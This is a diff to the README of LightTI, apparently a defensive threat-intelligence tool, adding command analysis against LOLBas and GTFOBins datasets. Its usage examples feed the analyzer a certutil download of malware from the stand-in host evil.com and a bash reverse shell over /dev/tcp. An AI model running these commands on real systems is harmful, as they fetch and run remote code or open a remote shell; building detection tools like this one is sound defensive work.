@@ -8,6 +8,7 @@ What sets LightTI apart from similar tools:
 
 - **Unified risk scoring**: a weighted scoring system (0-100) across VirusTotal, AbuseIPDB, and GreyNoise provides immediate threat context, collapsing the search-then-analyse workflow into one step.
 - **LLM-powered Sigma rule generation**: for high-risk IOCs, LightTI can generate a Sigma detection rule ready to paste directly into a SIEM, giving analysts a head start on custom detection.
+- **Command analysis**: suspicious process executions are analysed against LOLBas (Windows) and GTFOBins (Unix) datasets, with LLM-powered per-argument breakdown and recommended analyst actions.
 
 ---
 
@@ -21,6 +22,7 @@ What sets LightTI apart from similar tools:
 | LLM | Groq (production), Ollama (local dev) |
 | Deployment | GCP Cloud Run, Vercel |
 | Containerisation | Docker (multi-stage build) |
+| CI/CD | GitHub Actions |
 
 ---
 
@@ -37,9 +39,11 @@ The enrichment engine queries threat intel sources concurrently using goroutines
 - IP enrichment across VirusTotal, AbuseIPDB, GreyNoise, and IpToLocation
 - Weighted threat scoring with per-source score breakdowns and reasoning
 - LLM-powered Sigma rule generation for high-risk IPs (score >= 40)
+- Suspicious command analysis against LOLBas and GTFOBins datasets with per-argument LLM breakdown
 - REST API with persistent storage of all lookups
-- React dashboard with cyber/terminal aesthetic and progressive LLM loading
-- CLI with `enrich` and `server` subcommands
+- React dashboard with mode switcher between IP enrichment and command analysis
+- CLI with `enrich`, `analyze`, and `server` subcommands
+- GitHub Actions CI/CD pipeline with automated deployment and security scanning (gosec, govulncheck, Trivy)
 
 ---
 
@@ -111,6 +115,11 @@ go run ./cmd/lightti enrich --ip 1.1.1.1
 
 # Enrich with LLM Sigma rule generation
 go run ./cmd/lightti enrich --ip 1.1.1.1 --llm
+
+# Analyze a suspicious command
+go run ./cmd/lightti analyze --command "whoami /all"
+go run ./cmd/lightti analyze --command "certutil -urlcache -split -f http://evil.com/malware.exe"
+go run ./cmd/lightti analyze --command "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
 ```
 
 ---
@@ -137,9 +146,10 @@ gcloud run deploy lightti \
 
 Set environment variables on Cloud Run:
 ```bash
+# Use --update-env-vars to avoid wiping existing vars
 gcloud run services update lightti \
   --region europe-west2 \
-  --set-env-vars "DATABASE_URL=...,GROQ_API_KEY=...,LLM_PROVIDER=groq,..."
+  --update-env-vars "DATABASE_URL=...,GROQ_API_KEY=...,LLM_PROVIDER=groq,..."
 ```
 
 ### Frontend (Vercel)
@@ -161,6 +171,7 @@ Vercel auto-deploys on every push to `main`.
 - [ ] Redis caching for repeated IOC lookups
 - [ ] Batch processing for multiple IOCs
 - [ ] Export enrichment report as PDF
+- [ ] Cybersecurity news feed (RSS-based, category filtering)
 
 ---
 
@@ -193,6 +204,26 @@ Enrich an IP address against all threat intelligence sources.
   },
   "results": [],
   "llm_analysis": "Sigma rule YAML..."
+}
+```
+
+### POST /analyze
+
+Analyze a suspicious command against LOLBas and GTFOBins datasets with LLM-powered breakdown.
+
+**Request:**
+```json
+{
+  "ioc": "whoami /all",
+  "ioc_type": "command"
+}
+```
+
+**Response:**
+```json
+{
+  "lookup_id": "uuid",
+  "results": "1. Risk Level: ...\n2. Source: ...\n3. Intent: ...\n4. Recommended Actions: ..."
 }
 ```
 
